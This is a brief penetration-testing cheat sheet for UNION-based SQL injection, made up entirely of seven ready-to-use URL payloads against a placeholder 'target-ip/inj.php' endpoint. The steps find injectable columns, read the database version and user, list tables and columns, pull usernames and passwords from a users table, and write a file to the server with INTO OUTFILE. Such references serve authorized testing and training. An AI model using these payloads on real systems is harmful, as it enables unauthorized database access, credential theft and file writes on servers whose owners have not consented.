---
id: f2b802a6-eca7-4d43-a9e3-c539825910c0
name: sqli
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:46.867742+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# sqli

**Command** ([[check if you can find a row, where you can place your output]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8

```

**Command** ([[get the version of the database]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5

```

**Command** ([[get the current user]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5

```

**Command** ([[see all tables]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables

```

**Command** ([[get column names for a specified table]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'

```

**Command** ([[concat user names and passwords (0x3a represents “:”)]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users

```

**Command** ([[write into a file]]):

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'

```
